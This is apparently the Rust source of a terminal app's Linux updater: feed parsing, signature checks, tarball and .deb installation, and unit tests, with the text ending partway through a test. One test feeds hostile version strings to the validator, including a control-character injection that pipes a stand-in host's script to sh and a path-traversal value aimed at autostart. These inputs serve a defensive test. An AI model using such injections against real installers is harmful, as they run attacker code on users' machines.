//! Flow's own updater on Linux, where there's no Sparkle: it reads the
//! signed appcast for this computer's architecture from the public
//! arcanii/Flow-releases repo (see linux/RELEASING.md), and installs a newer
//! release by running the release's own install.sh into the folder Flow runs
//! from. The download must be signed with Flow's update key, as for Sparkle
//! and WinSparkle. A Flow from the .deb (dpkg's, in /usr) can't replace
//! itself: where the feed carries the release's .deb, signed too, it's
//! downloaded and checked, and Flow runs `sudo apt install` on it in a tab
//! (`UpdateState::InTab`), where sudo asks for the password; once the new
//! Flow is in place, it's installed. Flow shows how it stands
//! (`UpdateState`) in About, since there's no updater window here. Only a
//! build made as one of Flow's releases starts it (`version::UPDATES`).

use std::io::Read;
use std::os::unix::fs::DirBuilderExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::{Mutex, OnceLock};
use std::time::Duration;

use base64::engine::general_purpose::STANDARD;
use base64::Engine as _;
use ed25519_dalek::{Signature, VerifyingKey};
use flow_core::event::UserEvent;
use flow_core::i18n::tf;
use flow_core::platform::UpdateState;
use flow_core::session::Waker;

/// The feed for this architecture ("x86_64", "aarch64"), in the public
/// releases repo, apart from the source. FLOW_UPDATE_FEED points
/// elsewhere, for trying a feed before it's published: what it offers must
/// still be signed with Flow's key.
fn feed_url() -> String {
    std::env::var("FLOW_UPDATE_FEED").ok().filter(|u| !u.is_empty()).unwrap_or_else(|| {
        format!("https://raw.githubusercontent.com/arcanii/Flow-releases/main/appcast-linux-{}.xml", std::env::consts::ARCH)
    })
}

/// The biggest download taken: a release is about 15 MB.
const MAX_DOWNLOAD: u64 = 256 << 20;

/// A release the feed offers.
#[derive(Debug, Clone, PartialEq)]
struct Release {
    /// "0.1.24".
    version: String,
    /// Its build number (the commit count it was built at, plus
    /// `build_offset`), which orders releases.
    build: u64,
    url: String,
    length: u64,
    /// Ed25519 over the tarball's bytes, in base64 (sparkle:edSignature).
    signature: String,
    /// The release's page (sparkle:releaseNotesLink), where its .deb is too.
    notes: Option<String>,
    /// The release's .deb, where the feed carries it (a second enclosure,
    /// `DEB_TYPE`, after the tarball's, which a Flow before 0.1.37.1 reads
    /// alone).
    deb: Option<Deb>,
}

/// A release's .deb as the feed gives it: signed with Flow's key as its
/// tarball is, so a .deb's Flow checks it before apt is handed it.
#[derive(Debug, Clone, PartialEq)]
struct Deb {
    url: String,
    length: u64,
    /// Ed25519 over the .deb's bytes, in base64 (sparkle:edSignature).
    signature: String,
}

/// The type of the feed's enclosure for a release's .deb.
const DEB_TYPE: &str = "application/vnd.debian.binary-package";

impl Release {
    /// "0.1.24 (build 160)", as Flow writes its own version.
    fn display(&self) -> String {
        format!("{} (build {})", self.version, self.build)
    }
}

struct Updater {
    /// The folder install.sh put Flow in: Flow is `<prefix>/bin/flow`.
    prefix: PathBuf,
    feed: String,
    waker: Waker,
    state: Mutex<UpdateState>,
    /// What the last check found, for `install`.
    found: Mutex<Option<Release>>,
}

static UPDATER: OnceLock<Updater> = OnceLock::new();

/// Starts the updater if this Flow is one install.sh put in place
/// (`<prefix>/bin/flow` beside its menu entry); run from where it was built,
/// or by a package manager's own files, there's nothing for it to replace.
pub fn init(waker: Waker) -> bool {
    if UPDATER.get().is_some() {
        return true;
    }
    let Some(prefix) = install_prefix() else {
        log::info!("updater off: not a copy install.sh installed");
        return false;
    };
    let feed = feed_url();
    log::info!("updater on ({}, {feed})", flow_core::version::display());
    let _ = UPDATER.set(Updater {
        prefix,
        feed,
        waker,
        state: Mutex::new(UpdateState::Idle),
        found: Mutex::new(None),
    });
    true
}

fn install_prefix() -> Option<PathBuf> {
    let exe = std::env::current_exe().ok()?;
    let bin = exe.parent()?;
    let prefix = bin.parent()?;
    let installed = bin.file_name()? == "bin"
        && prefix.join("lib/flow-terminal").is_dir()
        && prefix.join(format!("share/applications/{}.desktop", crate::APP_ID)).is_file();
    installed.then(|| prefix.to_path_buf())
}

pub fn available() -> bool {
    UPDATER.get().is_some()
}

pub fn state() -> Option<UpdateState> {
    UPDATER.get().map(|u| lock(&u.state).clone())
}

fn lock<T>(m: &Mutex<T>) -> std::sync::MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

/// Looks for a newer release on a thread of its own. A quiet check (the
/// daily one) changes nothing that shows unless it finds one.
pub fn check(quiet: bool) {
    let Some(u) = UPDATER.get() else { return };
    {
        let mut state = lock(&u.state);
        // One thing at a time; once installed, what's left is a restart, and
        // while apt is in a tab, what's left is apt.
        if matches!(*state, UpdateState::Checking | UpdateState::Installing { .. } | UpdateState::InTab { .. } | UpdateState::Installed { .. }) {
            return;
        }
        if !quiet {
            *state = UpdateState::Checking;
        }
    }
    u.waker.send(UserEvent::Update);
    std::thread::spawn(move || {
        let current: u64 = flow_core::version::BUILD.parse().unwrap_or(0);
        let result = newest_release(&u.feed);
        let mut state = lock(&u.state);
        if matches!(*state, UpdateState::Installing { .. } | UpdateState::InTab { .. } | UpdateState::Installed { .. }) {
            return;
        }
        match result {
            Ok(Some(release)) if release.build > current => {
                log::info!("update: {} is out", release.display());
                *state = UpdateState::Available { version: release.display() };
                *lock(&u.found) = Some(release);
            }
            Ok(_) => {
                log::info!("update: {} is the newest", flow_core::version::display());
                if !quiet {
                    *state = UpdateState::UpToDate;
                }
            }
            Err(error) => {
                log::warn!("update check failed: {error}");
                if !quiet {
                    *state = UpdateState::Failed(error);
                }
            }
        }
        drop(state);
        u.waker.send(UserEvent::Update);
    });
}

/// Downloads, checks and installs what the last check found, on a thread
/// of its own.
pub fn install() {
    let Some(u) = UPDATER.get() else { return };
    let Some(release) = lock(&u.found).clone() else { return };
    let version = release.display();
    {
        let mut state = lock(&u.state);
        if !matches!(*state, UpdateState::Available { .. }) {
            return;
        }
        // Installed as root, say, so the user installs it as they did this
        // one. Checked before anything is replaced, so an install can't stop
        // half-way with a new flow beside the old games.
        if !install_writable(&u.prefix) {
            if from_deb(&u.prefix) && release.deb.is_some() {
                // dpkg's to replace, with the .deb in the feed: downloaded
                // and checked here, then apt runs on it in a tab.
                *state = UpdateState::Installing { version: version.clone() };
                drop(state);
                u.waker.send(UserEvent::Update);
                std::thread::spawn(move || fetch_deb_for_apt(u, release, version));
                return;
            } else if from_deb(&u.prefix) {
                // dpkg's to replace, and a feed without the .deb: it's on
                // the release page, which opens, and About gives the
                // command that installs it from the downloads folder, where
                // the browser puts it.
                open_page(release.notes.as_deref());
                let file = deb_file(&release.version);
                let home = dirs::home_dir();
                let command = apt_command(&downloads_dir(home.as_deref()).join(&file), home.as_deref());
                *state = UpdateState::ByHand { version, file, command };
            } else {
                let folder = u.prefix.display().to_string();
                *state = UpdateState::Failed(tf("update.not_writable", &[("version", &version), ("folder", &folder)]));
            }
            drop(state);
            u.waker.send(UserEvent::Update);
            return;
        }
        *state = UpdateState::Installing { version: version.clone() };
    }
    u.waker.send(UserEvent::Update);
    std::thread::spawn(move || {
        let result = install_release(&release, &u.prefix, flow_core::UPDATE_PUBLIC_KEY, &cache_dir());
        let next = match result {
            Ok(()) => {
                log::info!("update: installed {version} in {}", u.prefix.display());
                UpdateState::Installed { version }
            }
            Err(error) => {
                log::warn!("update of {version} failed: {error:?}");
                UpdateState::Failed(error.say(&version))
            }
        };
        *lock(&u.state) = next;
        u.waker.send(UserEvent::Update);
    });
}

/// Downloads the release's .deb into the downloads folder, checked with
/// Flow's key and against the release's build, and hands About the command
/// that installs it, which Flow runs in a tab (`UpdateState::InTab`); then
/// watches for the new Flow in place.
fn fetch_deb_for_apt(u: &'static Updater, release: Release, version: String) {
    let home = dirs::home_dir();
    let downloads = downloads_dir(home.as_deref());
    let file = deb_file(&release.version);
    let next = match fetch_deb(&release, flow_core::UPDATE_PUBLIC_KEY, &downloads, &file) {
        Ok(path) => {
            log::info!("update: {version}'s .deb checked, in {}", path.display());
            UpdateState::InTab { version: version.clone(), command: apt_command(&path, home.as_deref()) }
        }
        Err(error) => {
            log::warn!("update of {version} failed: {error:?}");
            UpdateState::Failed(error.say(&version))
        }
    };
    let in_tab = matches!(next, UpdateState::InTab { .. });
    *lock(&u.state) = next;
    u.waker.send(UserEvent::Update);
    if in_tab {
        wait_for_apt(u, version);
    }
}

/// How often the updater looks for apt's having put the new Flow in place.
const APT_LOOK_EVERY: Duration = Duration::from_secs(1);

/// While apt runs in its tab (`UpdateState::InTab`), looks each second for
/// the new Flow in place of this one (`replaced`), which makes it
/// installed: About's button then restarts into it.
fn wait_for_apt(u: &Updater, version: String) {
    loop {
        std::thread::sleep(APT_LOOK_EVERY);
        let mut state = lock(&u.state);
        if !matches!(*state, UpdateState::InTab { .. }) {
            return;
        }
        if replaced() {
            log::info!("update: apt put {version} in place");
            *state = UpdateState::Installed { version };
            drop(state);
            u.waker.send(UserEvent::Update);
            return;
        }
    }
}

/// The user's downloads folder, where the browser would put the .deb.
fn downloads_dir(home: Option<&Path>) -> PathBuf {
    dirs::download_dir().or_else(|| home.map(|h| h.join("Downloads"))).unwrap_or_default()
}

/// Downloads `release`'s .deb, checks that `key` (base64) signed it and that
/// it's that build of Flow's package (`dpkg-deb`), and writes it into
/// `dir` as `file`, whole and then renamed into place. Nothing is written
/// unless the signature holds.
fn fetch_deb(release: &Release, key: &str, dir: &Path, file: &str) -> Result<PathBuf, UpdateError> {
    let Some(deb) = &release.deb else { return Err(UpdateError::Download("the feed gives no .deb".into())) };
    if deb.length == 0 || deb.length > MAX_DOWNLOAD {
        return Err(UpdateError::Download(format!("the feed gives the .deb's size as {} bytes", deb.length)));
    }
    let bytes = download(&deb.url, deb.length)?;
    if !signed(&bytes, &deb.signature, key) {
        return Err(UpdateError::NotSigned);
    }
    let fail = |e: &dyn std::fmt::Display| UpdateError::Install(e.to_string());
    std::fs::create_dir_all(dir).map_err(|e| fail(&e))?;
    let part = dir.join(format!(".{file}.part-{}", std::process::id()));
    let path = dir.join(file);
    let kept = std::fs::write(&part, &bytes).map_err(|e| fail(&e)).and_then(|()| deb_is_build(&part, release.build)).and_then(|()| std::fs::rename(&part, &path).map_err(|e| fail(&e)));
    if kept.is_err() {
        let _ = std::fs::remove_file(&part);
    }
    kept.map(|()| path)
}

/// Whether the .deb at `path` is Flow's package at `build`, as package.sh
/// versions it (the marketing version, then the build), as the tarball's
/// flow must say its build.
fn deb_is_build(path: &Path, build: u64) -> Result<(), UpdateError> {
    let fail = |e: &dyn std::fmt::Display| UpdateError::Install(e.to_string());
    let out = Command::new("dpkg-deb").arg("-f").arg(path).arg("Package").arg("Version").stdin(Stdio::null()).output().map_err(|e| fail(&e))?;
    let fields = String::from_utf8_lossy(&out.stdout).into_owned();
    let field = |name: &str| fields.lines().find_map(|l| l.strip_prefix(&format!("{name}: "))).map(str::trim).unwrap_or("").to_string();
    let (package, version) = (field("Package"), field("Version"));
    if out.status.success() && package == "flow-terminal" && version.ends_with(&format!(".{build}")) {
        Ok(())
    } else {
        Err(fail(&format!("the .deb is {package:?} {version:?}, not flow-terminal at build {build}")))
    }
}

/// Whether Flow at `prefix` came from the release's .deb: dpkg's, in /usr.
fn from_deb(prefix: &Path) -> bool {
    prefix == Path::new("/usr") && Path::new("/var/lib/dpkg/info/flow-terminal.list").is_file()
}

/// The release's .deb for this computer, as linux/scripts/package.sh names
/// it, with Debian's name for the architecture.
fn deb_file(version: &str) -> String {
    let arch = match std::env::consts::ARCH {
        "x86_64" => "amd64",
        "aarch64" => "arm64",
        other => other,
    };
    format!("Flow-{version}-linux-{arch}.deb")
}

/// The command that installs the .deb at `path` over this Flow: apt's,
/// which takes a file named with a slash and brings what it depends on.
/// The home folder is written `~`, where the rest needs no quotes, and a
/// path the shell would split or read is quoted whole.
fn apt_command(path: &Path, home: Option<&Path>) -> String {
    let plain = |s: &str| !s.is_empty() && s.chars().all(|c| c.is_alphanumeric() || "/._+-,:@".contains(c));
    let path = if path.is_relative() { Path::new(".").join(path) } else { path.to_path_buf() };
    let full = path.to_string_lossy();
    let word = match home.and_then(|h| path.strip_prefix(h).ok()).map(|rest| rest.to_string_lossy().into_owned()) {
        Some(rest) if plain(&rest) => format!("~/{rest}"),
        _ if plain(&full) => full.into_owned(),
        _ => format!("'{}'", full.replace('\'', r"'\''")),
    };
    format!("sudo apt install {word}")
}

/// Opens a release's page in the browser.
fn open_page(notes: Option<&str>) {
    crate::open_url(page_for(notes));
}

/// The feed's link where it's one of Flow-releases' own pages (the feed
/// isn't what's signed), else the list of releases.
fn page_for(notes: Option<&str>) -> &str {
    const RELEASES: &str = flow_core::version::RELEASES;
    notes.filter(|n| n.starts_with(&format!("{RELEASES}/")) && !n.contains(char::is_whitespace)).unwrap_or(RELEASES)
}

/// Whether the program this Flow runs from is no longer the one on disk:
/// install.sh and dpkg each put the new file in the old one's place, and
/// the kernel then names the running program's "<path> (deleted)".
pub fn replaced() -> bool {
    replaced_at(Path::new("/proc/self/exe"))
}

/// As `replaced`, for a process's `exe` link in /proc.
fn replaced_at(exe: &Path) -> bool {
    use std::os::unix::ffi::OsStrExt;
    std::fs::read_link(exe).is_ok_and(|p| p.as_os_str().as_bytes().ends_with(b" (deleted)"))
}

/// Starts the Flow install.sh just put in place; this one then quits.
pub fn relaunch() -> bool {
    let Some(u) = UPDATER.get() else { return false };
    let flow = u.prefix.join("bin/flow");
    match Command::new(&flow).stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).spawn() {
        Ok(_) => true,
        Err(err) => {
            log::warn!("could not start {}: {err}", flow.display());
            false
        }
    }
}

/// The user's own cache folder, where the download is unpacked: unlike
/// /tmp, no one else can put anything in the way there.
fn cache_dir() -> PathBuf {
    let base = std::env::var_os("XDG_CACHE_HOME")
        .map(PathBuf::from)
        .filter(|p| p.is_absolute())
        .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".cache")))
        .unwrap_or_else(std::env::temp_dir);
    base.join(flow_core::APP_ID)
}

/// Whether install.sh can write everywhere it puts something under
/// `prefix`: Flow, the games, the menu entry and each size of icon. A folder
/// it would make is tried by the nearest one there is.
fn install_writable(prefix: &Path) -> bool {
    let icons = prefix.join("share/icons/hicolor");
    let mut dirs = vec![prefix.join("bin"), prefix.join("lib/flow-terminal/games"), prefix.join("share/applications"), icons.clone()];
    dirs.extend(std::fs::read_dir(&icons).into_iter().flatten().flatten().map(|e| e.path().join("apps")));
    dirs.iter().all(|dir| dir.ancestors().find(|d| d.is_dir()).is_some_and(writable))
}

/// Whether Flow can put files in `dir`: tried, not guessed from the modes.
fn writable(dir: &Path) -> bool {
    let probe = dir.join(format!(".flow-update-{}", std::process::id()));
    let ok = std::fs::OpenOptions::new().write(true).create_new(true).open(&probe).is_ok();
    let _ = std::fs::remove_file(&probe);
    ok
}

fn agent() -> ureq::Agent {
    ureq::Agent::config_builder()
        .timeout_connect(Some(Duration::from_secs(20)))
        .timeout_global(Some(Duration::from_secs(10 * 60)))
        .user_agent(concat!("flow-terminal/", env!("CARGO_PKG_VERSION")))
        .build()
        .into()
}

/// The newest release the feed at `url` offers, or None if it offers none.
/// The error is for the user, in their language.
fn newest_release(url: &str) -> Result<Option<Release>, String> {
    let failed = |error: &dyn std::fmt::Display| tf("update.check_failed", &[("error", &error)]);
    let text = match agent().get(url).call() {
        Ok(mut resp) => resp.body_mut().with_config().limit(1 << 20).read_to_string().map_err(|e| failed(&e))?,
        // No feed for this architecture yet.
        Err(ureq::Error::StatusCode(404)) => return Err(tf("update.no_release", &[("arch", &std::env::consts::ARCH)])),
        Err(e) => return Err(failed(&e)),
    };
    Ok(releases(&text).into_iter().max_by_key(|r| r.build))
}

/// Every release in an appcast: Sparkle's form, one `<enclosure>` with
/// `sparkle:version` (the build), `sparkle:shortVersionString`,
/// `sparkle:edSignature` and `length` for each. Ones missing a part are
/// passed over, and so are ones whose version isn't a release's
/// ([`plain_version`]).
fn releases(xml: &str) -> Vec<Release> {
    let mut out = Vec::new();
    // Each <item>'s enclosures, with the item's release notes link: the
    // tarball's, then, where the feed carries it, the .deb's (`DEB_TYPE`).
    for item in xml.split("<item").skip(1) {
        let item = item.split("</item>").next().unwrap_or(item);
        let enclosures: Vec<Vec<(String, String)>> = item
            .split("<enclosure")
            .skip(1)
            .map(|tag| attributes(&tag[..tag.find('>').unwrap_or(tag.len())]))
            .collect();
        let get = |attrs: &[(String, String)], name: &str| attrs.iter().find(|(k, _)| k == name).map(|(_, v)| v.clone());
        let is_deb = |attrs: &[(String, String)]| get(attrs, "type").as_deref() == Some(DEB_TYPE);
        let Some(attrs) = enclosures.iter().find(|a| !is_deb(a)) else { continue };
        let deb = enclosures.iter().find(|a| is_deb(a)).and_then(|a| {
            Some(Deb { url: get(a, "url")?, length: get(a, "length")?.trim().parse().ok()?, signature: get(a, "sparkle:edSignature")? })
        });
        let notes = element(item, "sparkle:releaseNotesLink");
        let get = |name: &str| get(attrs, name);
        let release = (|| {
            Some(Release {
                version: get("sparkle:shortVersionString")?,
                build: get("sparkle:version")?.trim().parse().ok()?,
                url: get("url")?,
                length: get("length")?.trim().parse().ok()?,
                signature: get("sparkle:edSignature")?,
                notes: notes.clone(),
                deb: deb.clone(),
            })
        })();
        match release {
            Some(r) if !plain_version(&r.version) => log::warn!("update feed: a release's version isn't numbers and dots: {:?}", r.version),
            Some(r) => out.push(r),
            None => log::warn!("update feed: an enclosure lacks a part: {attrs:?}"),
        }
    }
    out
}

/// Whether `version` is a release's as Flow's scripts write one: numbers
/// and dots, "0.1.44.3". The feed isn't what's signed, and the version
/// names the .deb saved in the downloads folder and the `sudo apt install`
/// typed in a tab of its own (`apt_command`), where a control character
/// would be a key (a Ctrl+U throwing away what's typed, quotes and all,
/// so the rest of the name ran as a command just as sudo asks for the
/// password) and a slash another folder.
fn plain_version(version: &str) -> bool {
    let parts: Vec<&str> = version.split('.').collect();
    (1..=4).contains(&parts.len()) && parts.iter().all(|p| (1..=9).contains(&p.len()) && p.bytes().all(|b| b.is_ascii_digit()))
}

/// The text of the first `<name>…</name>` in `xml`, entities undone.
fn element(xml: &str, name: &str) -> Option<String> {
    let open = format!("<{name}>");
    let start = xml.find(&open)? + open.len();
    let text = &xml[start..start + xml[start..].find("</")?];
    let text = unescape(text.trim());
    (!text.is_empty()).then_some(text)
}

fn unescape(s: &str) -> String {
    s.replace("&quot;", "\"").replace("&apos;", "'").replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&")
}

/// `name="value"` pairs (or single-quoted), XML's five entities undone.
fn attributes(tag: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut rest = tag;
    while let Some(eq) = rest.find('=') {
        let name = rest[..eq].trim().trim_end_matches('/').rsplit(char::is_whitespace).next().unwrap_or("").to_string();
        let after = rest[eq + 1..].trim_start();
        let Some(quote) = after.chars().next().filter(|c| *c == '"' || *c == '\'') else { break };
        let Some(close) = after[1..].find(quote) else { break };
        let value = unescape(&after[1..1 + close]);
        out.push((name, value));
        rest = &after[close + 2..];
    }
    out
}

/// Why an install didn't happen.
#[derive(Debug)]
enum UpdateError {
    Download(String),
    /// The download isn't the release Flow's key signed.
    NotSigned,
    Install(String),
}

impl UpdateError {
    fn say(&self, version: &str) -> String {
        match self {
            UpdateError::Download(e) => tf("update.download_failed", &[("version", &version), ("error", e)]),
            UpdateError::NotSigned => tf("update.not_signed", &[("version", &version)]),
            UpdateError::Install(e) => tf("update.install_failed", &[("version", &version), ("error", e)]),
        }
    }
}

/// Downloads `release`, checks that `key` (base64) signed it, unpacks it
/// under `temp`, checks that its flow is that build, and runs its
/// install.sh into `prefix`. Nothing is unpacked unless the signature holds.
fn install_release(release: &Release, prefix: &Path, key: &str, temp: &Path) -> Result<(), UpdateError> {
    if release.length == 0 || release.length > MAX_DOWNLOAD {
        return Err(UpdateError::Download(format!("the feed gives its size as {} bytes", release.length)));
    }
    let bytes = download(&release.url, release.length)?;
    if !signed(&bytes, &release.signature, key) {
        return Err(UpdateError::NotSigned);
    }
    // A folder of its own, made new and private: a name someone else put
    // there first (a link, say) is an error, not a place to unpack into.
    std::fs::create_dir_all(temp).map_err(|e| UpdateError::Install(e.to_string()))?;
    let dir = temp.join(format!("update-{}-{}", std::process::id(), release.build));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::DirBuilder::new().mode(0o700).create(&dir).map_err(|e| UpdateError::Install(e.to_string()))?;
    let result = unpack_and_install(&bytes, &dir, release, prefix);
    let _ = std::fs::remove_dir_all(&dir);
    result
}

fn download(url: &str, length: u64) -> Result<Vec<u8>, UpdateError> {
    let mut resp = agent().get(url).call().map_err(|e| UpdateError::Download(e.to_string()))?;
    let mut bytes = Vec::with_capacity(length as usize);
    resp.body_mut()
        .with_config()
        .limit(length + 1)
        .reader()
        .read_to_end(&mut bytes)
        .map_err(|e| UpdateError::Download(e.to_string()))?;
    if bytes.len() as u64 != length {
        return Err(UpdateError::Download(format!("{} bytes came, not {length}", bytes.len())));
    }
    Ok(bytes)
}

/// Whether `signature` (base64) is `key`'s (base64) Ed25519 signature of
/// `bytes`, as Sparkle's sign_update and examples/update_key.rs make it.
fn signed(bytes: &[u8], signature: &str, key: &str) -> bool {
    let key: Option<[u8; 32]> = STANDARD.decode(key.trim()).ok().and_then(|k| k.try_into().ok());
    let sig: Option<[u8; 64]> = STANDARD.decode(signature.trim()).ok().and_then(|s| s.try_into().ok());
    let (Some(key), Some(sig)) = (key, sig) else { return false };
    VerifyingKey::from_bytes(&key).is_ok_and(|k| k.verify_strict(bytes, &Signature::from_bytes(&sig)).is_ok())
}

fn unpack_and_install(bytes: &[u8], dir: &Path, release: &Release, prefix: &Path) -> Result<(), UpdateError> {
    let fail = |e: &dyn std::fmt::Display| UpdateError::Install(e.to_string());
    let tarball = dir.join("release.tar.gz");
    std::fs::write(&tarball, bytes).map_err(|e| fail(&e))?;
    run(Command::new("tar").arg("-xzf").arg(&tarball).arg("-C").arg(dir))?;
    // flow-<version>/, as package.sh lays it out.
    let top = std::fs::read_dir(dir)
        .map_err(|e| fail(&e))?
        .flatten()
        .map(|e| e.path())
        .find(|p| p.is_dir() && p.join("install.sh").is_file())
        .ok_or_else(|| fail(&"it holds no install.sh"))?;
    // The flow inside must be the build the feed named, as the release
    // scripts check before publishing.
    let out = Command::new(top.join("bin/flow")).arg("--version").output().map_err(|e| fail(&e))?;
    let reported = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if !reported.ends_with(&format!("(build {})", release.build)) {
        return Err(fail(&format!("its flow says {reported:?}")));
    }
    run(Command::new("sh").arg(top.join("install.sh")).arg("--prefix").arg(prefix))
}

/// Runs `cmd`, failing with the last line it wrote to stderr.
fn run(cmd: &mut Command) -> Result<(), UpdateError> {
    let out = cmd.stdin(Stdio::null()).output().map_err(|e| UpdateError::Install(e.to_string()))?;
    if out.status.success() {
        return Ok(());
    }
    let stderr = String::from_utf8_lossy(&out.stderr);
    let last = stderr.lines().rev().find(|l| !l.trim().is_empty()).unwrap_or("").trim().to_string();
    Err(UpdateError::Install(if last.is_empty() { out.status.to_string() } else { last }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use ed25519_dalek::{Signer, SigningKey};
    use std::io::{BufRead, BufReader, Write};
    use std::net::TcpListener;

    const FEED: &str = r#"<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle">
  <channel>
    <item>
      <title>Version 0.1.23</title>
      <sparkle:releaseNotesLink>https://github.com/arcanii/Flow-releases/releases/tag/v0.1.23-linux</sparkle:releaseNotesLink>
      <enclosure url="https://example.com/Flow-0.1.23-linux-x86_64.tar.gz?a=1&amp;b=2"
                 sparkle:version="146"
                 sparkle:shortVersionString="0.1.23"
                 sparkle:edSignature="c2lnbmF0dXJl"
                 length="15000000"
                 type="application/octet-stream"/>
    </item>
    <item>
      <enclosure url='https://example.com/old.tar.gz' sparkle:version="120" sparkle:shortVersionString="0.1.20"
                 sparkle:edSignature="b2xk" length="10"/>
    </item>
    <item><enclosure url="https://example.com/broken.tar.gz" sparkle:version="999"/></item>
  </channel>
</rss>"#;

    #[test]
    fn the_feed_gives_each_release_and_the_newest_wins() {
        let found = releases(FEED);
        assert_eq!(found.len(), 2, "{found:?}");
        assert_eq!(
            found[0],
            Release {
                version: "0.1.23".into(),
                build: 146,
                url: "https://example.com/Flow-0.1.23-linux-x86_64.tar.gz?a=1&b=2".into(),
                length: 15_000_000,
                signature: "c2lnbmF0dXJl".into(),
                notes: Some("https://github.com/arcanii/Flow-releases/releases/tag/v0.1.23-linux".into()),
                deb: None,
            }
        );
        assert_eq!(found[1].notes, None);
        assert_eq!(found[1].build, 120);
        assert_eq!(found.into_iter().max_by_key(|r| r.build).unwrap().display(), "0.1.23 (build 146)");
        assert!(releases("<rss><channel></channel></rss>").is_empty());
    }

    /// A feed with the release's .deb as make-appcast.sh writes it: a
    /// second enclosure after the tarball's, which a Flow before 0.1.37.1,
    /// reading the first alone, never sees.
    #[test]
    fn the_feed_gives_a_releases_deb_beside_its_tarball() {
        let feed = r#"<rss><channel><item>
      <enclosure url="https://example.com/Flow-0.1.37.1-linux-x86_64.tar.gz" sparkle:version="540"
                 sparkle:shortVersionString="0.1.37.1" sparkle:edSignature="dGFy" length="16000000" type="application/gzip"/>
      <enclosure url="https://example.com/Flow-0.1.37.1-linux-amd64.deb" sparkle:version="540"
                 sparkle:shortVersionString="0.1.37.1" sparkle:edSignature="ZGVi" length="12000000"
                 type="application/vnd.debian.binary-package"/>
    </item></channel></rss>"#;
        let found = releases(feed);
        assert_eq!(found.len(), 1);
        assert_eq!((found[0].url.as_str(), found[0].signature.as_str()), ("https://example.com/Flow-0.1.37.1-linux-x86_64.tar.gz", "dGFy"));
        let deb = Deb { url: "https://example.com/Flow-0.1.37.1-linux-amd64.deb".into(), length: 12_000_000, signature: "ZGVi".into() };
        assert_eq!(found[0].deb.as_ref(), Some(&deb));
        // What an older Flow reads: the first enclosure, the tarball's.
        let first = &feed[feed.find("<enclosure").unwrap()..];
        assert!(first[..first.find('>').unwrap()].contains(".tar.gz"));
        // The .deb's enclosure first, or one lacking a part: the tarball
        // is still the release, the broken .deb none.
        let swapped = feed.replace("application/gzip", "TARBALL").replace(DEB_TYPE, "application/gzip").replace("TARBALL", DEB_TYPE);
        assert_eq!(releases(&swapped)[0].url, "https://example.com/Flow-0.1.37.1-linux-amd64.deb");
        let broken = feed.replace(r#"length="12000000""#, "");
        assert_eq!(releases(&broken)[0].deb, None);
    }

    /// A feed's version is the .deb's name and the apt command typed in a
    /// tab, and the feed isn't signed: a release whose version is anything
    /// but numbers and dots is passed over, its signed files whatever.
    #[test]
    fn a_release_whose_version_isnt_numbers_and_dots_is_passed_over() {
        let feed = |version: &str| {
            format!(
                r#"<rss><channel><item><enclosure url="https://example.com/Flow.tar.gz" sparkle:version="540" sparkle:shortVersionString="{version}" sparkle:edSignature="dGFy" length="16" type="application/gzip"/></item></channel></rss>"#
            )
        };
        for version in ["0.1.45", "0.1.44.3", "1", "0.1.46.0"] {
            assert_eq!(releases(&feed(version)).len(), 1, "{version}");
        }
        for version in ["0.1.46\u{15}curl -s evil.example|sh;#", "0.1.46\r", "0.1.46\u{1b}[2J", "../../.config/autostart/x", "0.1.46/x", "0.1.46 ", "0.1.46.DEV", "0..1", ".1", "1.", "", "0.1.2.3.4", "0.1.２", "1234567890.1"] {
            assert!(releases(&feed(version)).is_empty(), "{version:?}");
        }
        // What an entity in the attribute stands for is what's looked at.
        assert!(releases(&feed("0.1.46&amp;x")).is_empty());
    }

    /// A .deb of Flow's package at `version`, as dpkg-deb builds one, or
    /// none where this computer has no dpkg-deb.
    fn deb(work: &Path, version: &str) -> Option<Vec<u8>> {
        let top = work.join(format!("deb-{version}"));
        std::fs::create_dir_all(top.join("DEBIAN")).unwrap();
        std::fs::write(top.join("DEBIAN/control"), format!("Package: flow-terminal\nVersion: {version}\nArchitecture: all\nMaintainer: Flow <flow@example.com>\nDescription: a test\n")).unwrap();
        let out = work.join(format!("{version}.deb"));
        let built = Command::new("dpkg-deb").arg("--root-owner-group").arg("-b").arg(&top).arg(&out).stdout(Stdio::null()).status();
        built.is_ok_and(|s| s.success()).then(|| std::fs::read(out).unwrap())
    }

    #[test]
    fn a_signed_deb_of_the_build_is_kept_for_apt_and_others_are_not() {
        let root = std::env::temp_dir().join(format!("flow-deb-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let (work, downloads) = (root.join("work"), root.join("Downloads"));
        std::fs::create_dir_all(&work).unwrap();
        let Some(bytes) = deb(&work, "9.9.9.99999") else {
            eprintln!("no dpkg-deb here: skipped");
            return;
        };
        let other = deb(&work, "9.9.9.11111").unwrap();
        let key = key();
        let sign = |b: &[u8]| STANDARD.encode(key.sign(b).to_bytes());
        let mut tampered = bytes.clone();
        *tampered.last_mut().unwrap() ^= 1;
        let base = serve_with(|_| vec![("/good.deb".into(), bytes.clone()), ("/tampered.deb".into(), tampered.clone()), ("/other.deb".into(), other.clone())]);
        let release = |name: &str, length: usize, signature: String| Release {
            version: "9.9.9".into(),
            build: 99_999,
            url: format!("{base}/release.tar.gz"),
            length: 1,
            signature: String::new(),
            notes: None,
            deb: Some(Deb { url: format!("{base}/{name}"), length: length as u64, signature }),
        };
        let file = "Flow-9.9.9-linux-amd64.deb";
        let nothing_kept = || std::fs::read_dir(&downloads).map_or(0, |d| d.count()) == 0;

        // Bytes changed on the way: turned away before anything's written.
        let bad = fetch_deb(&release("tampered.deb", tampered.len(), sign(&bytes)), &public(&key), &downloads, file);
        assert!(matches!(bad, Err(UpdateError::NotSigned)), "{bad:?}");
        // Signed by another key, Flow's own included.
        let unsigned = fetch_deb(&release("good.deb", bytes.len(), sign(&bytes)), flow_core::UPDATE_PUBLIC_KEY, &downloads, file);
